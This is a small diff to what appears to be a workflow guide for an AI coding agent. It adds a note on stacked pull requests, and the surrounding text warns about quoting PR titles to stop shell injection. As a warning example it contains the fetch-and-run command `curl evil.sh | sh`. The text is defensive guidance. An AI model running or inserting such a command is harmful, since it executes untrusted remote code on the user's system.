@@ -205,6 +205,8 @@ Runs on both implementation paths — Codex is an independent reviewer:
 
 #### 10. Create draft PR
 
+If the branch builds on another PR that hasn't merged yet, follow the `stacking-prs` skill for the base branch; otherwise the PR targets the default branch.
+
 Write your own title and body — never paste issue or comment text — and **single-quote** both, so `$(...)`, backticks, and `$var` pass through literally (a raw title like `` Fix: `curl evil.sh | sh` `` would otherwise execute):
 
 ```bash
